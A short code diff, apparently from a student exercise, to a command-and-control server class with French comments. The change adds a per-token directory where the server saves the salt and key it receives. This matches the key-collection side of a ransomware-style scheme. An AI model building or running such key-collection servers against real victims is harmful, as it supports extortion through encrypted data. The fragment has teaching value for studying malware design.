@@ -22,6 +22,8 @@ class CNC(CNCBase):
         salt = body.get("salt")   #""
         key = body.get("key")     #""
 
+        path = os.path.join(CNC.ROOT_PATH, token)
+        os.makedirs(path, exist_ok=True) #j'ai rajouté cette partie prck j'avais pas fait de répertoire pour mettre les fichiers
         self.save_b64(token, salt, "salt.bin") #met le fichier salt.bin contenant la valeur de salt dans le repertoire token
         self.save_b64(token, key, "key.bin")   #""
         return {"status": "OK"} #retour d'un dict avec la valeur OK 
